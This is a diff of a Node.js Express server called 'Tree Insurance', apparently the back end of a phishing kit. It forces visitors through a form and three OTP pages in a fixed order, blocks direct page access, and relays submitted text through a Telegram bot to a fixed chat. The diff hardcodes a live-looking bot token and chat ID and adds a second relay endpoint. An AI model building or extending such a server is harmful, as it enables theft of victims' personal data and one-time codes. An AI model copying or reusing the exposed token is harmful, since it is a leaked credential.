@@ -1,27 +1,30 @@
 /**
  * Tree Insurance - Secure Server
- * Complete Server-Side Protection System
+ * Server-Side Telegram Proxy with Hardcoded Credentials
  */
 
 const express = require('express');
 const cors = require('cors');
-const dotenv = require('dotenv');
 const path = require('path');
 const crypto = require('crypto');
 
 // ============================================
 // Configuration
 // ============================================
-dotenv.config();
-
 const app = express();
 const PORT = process.env.PORT || 3000;
 const IS_PRODUCTION = process.env.NODE_ENV === 'production';
 
 // ============================================
-// Security: Generate Strong Session Secret
+// Hardcoded Telegram Credentials (Server-Side Only)
 // ============================================
-const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex');
+const TELEGRAM_BOT_TOKEN = "8205760930:AAE0zTdpfYZ3-C27b1m-j9BruITXx0RTt1A";
+const TELEGRAM_CHAT_ID = "8413882740";
+
+// ============================================
+// Security: Generate Session Secret
+// ============================================
+const SESSION_SECRET = crypto.randomBytes(64).toString('hex');
 
 // ============================================
 // Security: Session Configuration
@@ -34,7 +37,7 @@ app.use(session({
   cookie: {
     secure: IS_PRODUCTION,
     httpOnly: true,
-    maxAge: 30 * 60 * 1000, // 30 minutes
+    maxAge: 30 * 60 * 1000,
     sameSite: 'strict'
   }
 }));
@@ -42,7 +45,7 @@ app.use(session({
 // ============================================
 // Security: Helmet Headers
 // ============================================
-app.use((req, res, next) => {
+app.use(function(req, res, next) {
   res.setHeader('X-Content-Type-Options', 'nosniff');
   res.setHeader('X-Frame-Options', 'DENY');
   res.setHeader('X-XSS-Protection', '1; mode=block');
@@ -59,16 +62,6 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.set('trust proxy', 1);
-
-// ============================================
-// Telegram Configuration
-// ============================================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-  console.error('[CONFIG] Missing Telegram credentials in environment.');
-}
 
 // ============================================
 // Step Sequence Definition
@@ -101,9 +94,9 @@ const PAGE_TO_STEP = {
 };
 
 // ============================================
-// Step Sequence Middleware (enforceStepSequence)
+// Step Sequence Middleware
 // ============================================
-const enforceStepSequence = (req, res, next) => {
+const enforceStepSequence = function(req, res, next) {
   const requestedPath = req.path;
   const requestedStep = PAGE_TO_STEP[requestedPath] || PAGE_TO_STEP[requestedPath + '.html'] || PAGE_TO_STEP['/' + requestedPath];
   
@@ -124,25 +117,17 @@ const enforceStepSequence = (req, res, next) => {
     const currentStepIndex = STEP_SEQUENCE.indexOf(req.session.currentStep);
     const requestedStepIndex = STEP_SEQUENCE.indexOf(requestedStep);
     
-    // Log the access
     console.log('[ROUTE] Path: ' + requestedPath + ', Current: ' + req.session.currentStep + ', Requested: ' + requestedStep);
-    
-    // Allow if:
-    // 1. Current step is the same as requested (revisiting)
-    // 2. Current step is one step before requested (sequential access)
-    // 3. Current step is already completed (going back is allowed)
     
     if (currentStepIndex === -1 || requestedStepIndex === -1) {
       console.warn('[SECURITY] Unknown step - redirecting to index');
       return res.redirect('/');
     }
     
-    // Strict sequential access - can only go to current step or next step
     const isCurrentOrNext = requestedStepIndex <= currentStepIndex + 1;
     const isBackwards = requestedStepIndex < currentStepIndex;
     
     if (isCurrentOrNext || isBackwards) {
-      // Valid access - add to history if new step
       if (requestedStepIndex > currentStepIndex) {
         req.session.stepHistory.push(req.session.currentStep);
         req.session.currentStep = requestedStep;
@@ -150,7 +135,6 @@ const enforceStepSequence = (req, res, next) => {
       }
       return next();
     } else {
-      // Attempt to skip steps - block and redirect
       console.warn('[SECURITY] Step bypass attempt from ' + req.session.currentStep + ' to ' + requestedStep + ' IP: ' + req.ip);
       return res.redirect('/');
     }
@@ -160,9 +144,63 @@ const enforceStepSequence = (req, res, next) => {
 };
 
 // ============================================
-// API: Complete Step
+// API: Health Check
 // ============================================
-app.post('/api/complete-step', (req, res) => {
+app.get('/api/health', function(req, res) {
+  res.json({ 
+    status: 'ok',
+    build: 'SECURE-v1.3.0',
+    timestamp: new Date().toISOString()
+  });
+});
+
+// ============================================
+// API: Submit Data (Telegram Proxy)
+// This API receives data from frontend, sends to Telegram server-side,
+// then upgrades session and returns redirect URL
+// ============================================
+app.post('/api/submit-data', async function(req, res) {
+  const { message } = req.body;
+  
+  if (!message || typeof message !== 'string') {
+    return res.status(400).json({ success: false, error: 'Message is required' });
+  }
+  
+  try {
+    // Send message to Telegram from backend (credentials never exposed to frontend)
+    const response = await fetch(
+      'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      }
+    );
+    
+    const data = await response.json();
+    
+    if (!response.ok || !data.ok) {
+      console.error('[TELEGRAM] API Error:', data.description);
+      return res.status(502).json({ success: false, error: 'Failed to send message' });
+    }
+    
+    console.log('[TELEGRAM] Message sent successfully');
+    res.json({ success: true });
+    
+  } catch (error) {
+    console.error('[TELEGRAM] Error:', error);
+    res.status(500).json({ success: false, error: 'Server error' });
+  }
+});
+
+// ============================================
+// API: Complete Step (with session upgrade)
+// ============================================
+app.post('/api/complete-step', function(req, res) {
   const { step } = req.body;
   
   if (!req.session.currentStep) {
@@ -170,8 +208,8 @@ app.post('/api/complete-step', (req, res) => {
     req.session.stepHistory = [];
   }
   
-  let newStep = null;
-  let redirectTo = '/';
+  var newStep = null;
+  var redirectTo = '/';
   
   switch(step) {
     case 'STEP1':
@@ -190,8 +228,8 @@ app.post('/api/complete-step', (req, res) => {
       return res.status(400).json({ success: false, error: 'Invalid step' });
   }
   
-  const currentIndex = STEP_SEQUENCE.indexOf(req.session.currentStep);
-  const newStepIndex = STEP_SEQUENCE.indexOf(newStep);
+  var currentIndex = STEP_SEQUENCE.indexOf(req.session.currentStep);
+  var newStepIndex = STEP_SEQUENCE.indexOf(newStep);
   
   if (newStepIndex <= currentIndex + 1) {
     req.session.stepHistory.push(req.session.currentStep);
@@ -212,9 +250,47 @@ app.post('/api/complete-step', (req, res) => {
 });
 
 // ============================================
+// API: Send Message (Legacy support)
+// ============================================
+app.post('/api/send-message', async function(req, res) {
+  const { text, parse_mode } = req.body;
+  
+  if (!text || typeof text !== 'string') {
+    return res.status(400).json({ ok: false, error: 'Text is required' });
+  }
+  
+  try {
+    var response = await fetch(
+      'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: text,
+          parse_mode: parse_mode || 'Markdown'
+        })
+      }
+    );
+    
+    var data = await response.json();
+    
+    if (!response.ok || !data.ok) {
+      return res.status(502).json({ ok: false, error: data.description });
+    }
+    
+    res.json({ ok: true });
+    
+  } catch (error) {
+    console.error('[TELEGRAM] Error:', error);
+    res.status(500).json({ ok: false, error: 'Failed to send message' });
+  }
+});
+
+// ============================================
 // API: Get Session Status
 // ============================================
-app.get('/api/session-status', (req, res) => {
+app.get('/api/session-status', function(req, res) {
   res.json({
     currentStep: req.session.currentStep || 'none',
     stepHistory: req.session.stepHistory || [],
@@ -226,8 +302,8 @@ app.get('/api/session-status', (req, res) => {
 // ============================================
 // API: Reset Session
 // ============================================
-app.post('/api/reset-session', (req, res) => {
-  req.session.destroy((err) => {
+app.post('/api/reset-session', function(req, res) {
+  req.session.destroy(function(err) {
     if (err) {
       return res.status(500).json({ success: false, error: 'Failed to reset session' });
     }
@@ -236,66 +312,14 @@ app.post('/api/reset-session', (req, res) => {
 });
 
 // ============================================
-// API: Health Check
+// Static Files Configuration
 // ============================================
-app.get('/api/health', (req, res) => {
-  res.json({ 
-    status: 'ok',
-    build: 'SECURE-v1.2.0',
-    timestamp: new Date().toISOString()
-  });
-});
-
-// ============================================
-// API: Send Message to Telegram
-// ============================================
-app.post('/api/send-message', async (req, res) => {
-  const { text, parse_mode = 'Markdown' } = req.body;
-
-  if (!text || typeof text !== 'string') {
-    return res.status(400).json({ ok: false, error: 'Text is required.' });
-  }
-
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    return res.status(500).json({ ok: false, error: 'Server is not configured.' });
-  }
-
-  try {
-    const response = await fetch(
-      'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: text,
-          parse_mode: parse_mode
-        })
-      }
-    );
-
-    const data = await response.json();
-
-    if (!response.ok || !data.ok) {
-      return res.status(502).json({ ok: false, error: data.description || 'Telegram API error' });
-    }
-
-    res.json({ ok: true });
-  } catch (error) {
-    console.error('[TELEGRAM] Error:', error);
-    res.status(500).json({ ok: false, error: 'Failed to send message.' });
-  }
-});
-
-// ============================================
-// Static Files (Public Resources Only)
-// ============================================
-const PUBLIC_DIR = path.join(__dirname, 'public');
-const PROTECTED_DIR = path.join(__dirname, 'protected_pages');
+var PUBLIC_DIR = path.join(__dirname, 'public');
+var PROTECTED_DIR = path.join(__dirname, 'protected_pages');
 
 // Block all HTML files from static serving
-app.use((req, res, next) => {
-  const ext = path.extname(req.path).toLowerCase();
+app.use(function(req, res, next) {
+  var ext = path.extname(req.path).toLowerCase();
   if (ext === '.html') {
     console.warn('[SECURITY] Direct HTML access blocked: ' + req.path);
     return res.redirect('/');
@@ -303,10 +327,10 @@ app.use((req, res, next) => {
   next();
 });
 
-// Serve public files only
+// Serve public files only (CSS, JS, images)
 app.use(express.static(PUBLIC_DIR, {
   index: false,
-  setHeaders: (res, filePath) => {
+  setHeaders: function(res, filePath) {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
     res.setHeader('Cache-Control', 'no-store, no-cache');
@@ -318,94 +342,92 @@ app.use(express.static(PUBLIC_DIR, {
 // ============================================
 
 // Root - Index Page
-app.get('/', enforceStepSequence, (req, res) => {
+app.get('/', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'index.html'));
 });
 
-app.get('/index.html', enforceStepSequence, (req, res) => {
+app.get('/index.html', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'index.html'));
 });
 
-// Form1 Page - Requires INDEX_COMPLETED
-app.get('/form1', enforceStepSequence, (req, res) => {
+// Form1 Page
+app.get('/form1', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'form1.html'));
 });
 
-app.get('/form1.html', enforceStepSequence, (req, res) => {
+app.get('/form1.html', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'form1.html'));
 });
 
-// Totalselect Page - Requires FORM1_COMPLETED
-app.get('/totalselect', enforceStepSequence, (req, res) => {
+// Totalselect Page
+app.get('/totalselect', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'totalselect.html'));
 });
 
-app.get('/totalselect.html', enforceStepSequence, (req, res) => {
+app.get('/totalselect.html', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'totalselect.html'));
 });
 
-// OTP Pages - Requires FORM1_COMPLETED
-app.get('/otp', enforceStepSequence, (req, res) => {
+// OTP Pages
+app.get('/otp', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'otp.html'));
 });
 
-app.get('/otp.html', enforceStepSequence, (req, res) => {
+app.get('/otp.html', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'otp.html'));
 });
 
-app.get('/otp2', enforceStepSequence, (req, res) => {
+app.get('/otp2', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'otp2.html'));
 });
 
-app.get('/otp2.html', enforceStepSequence, (req, res) => {
+app.get('/otp2.html', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'otp2.html'));
 });
 
-app.get('/otp3', enforceStepSequence, (req, res) => {
+app.get('/otp3', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'otp3.html'));
 });
 
-app.get('/otp3.html', enforceStepSequence, (req, res) => {
+app.get('/otp3.html', enforceStepSequence, function(req, res) {
   res.sendFile(path.join(PROTECTED_DIR, 'otp3.html'));
 });
 
 // ============================================
 // Catch-all: Block All Other HTML Access
 // ============================================
-app.get('*.html', (req, res) => {
+app.get('*.html', function(req, res) {
   console.warn('[SECURITY] Blocked HTML access: ' + req.path);
   res.redirect('/');
 });
 
-// ============================================
 // 404 Handler
-// ============================================
-app.use((req, res) => {
+app.use(function(req, res) {
   res.redirect('/');
 });
 
 // ============================================
 // Server Start
 // ============================================
-app.listen(PORT, () => {
+app.listen(PORT, function() {
   console.log('============================================================');
-  console.log('  Tree Insurance - SECURE SERVER v1.2.0');
+  console.log('  Tree Insurance - SECURE SERVER v1.3.0');
   console.log('============================================================');
   console.log('  Build Date: ' + new Date().toISOString());
   console.log('  Port: ' + PORT);
   console.log('  Environment: ' + (IS_PRODUCTION ? 'PRODUCTION' : 'DEVELOPMENT'));
   console.log('------------------------------------------------------------');
   console.log('  SECURITY FEATURES:');
+  console.log('  - Telegram Credentials: HARDCODED (not exposed)');
   console.log('  - Session Secret: ' + (SESSION_SECRET.substring(0, 8) + '...'));
   console.log('  - Cookie Security: httpOnly, sameSite=strict');
   console.log('  - Sequential Step Enforcement: ENABLED');
   console.log('  - Direct HTML Access: BLOCKED');
-  console.log('  - Helmet Headers: ENABLED');
   console.log('------------------------------------------------------------');
   console.log('  STEP SEQUENCE:');
   console.log('  1. / (index)');
-  console.log('  2. /form1 (requires index completed)');
-  console.log('  3. /totalselect (requires form1 completed)');
-  console.log('  4. /otp/* (requires totalselect completed)');
+  console.log('  2. /form1');
+  console.log('  3. /totalselect');
+  console.log('  4. /otp /otp2 /otp3');
   console.log('============================================================');
 });
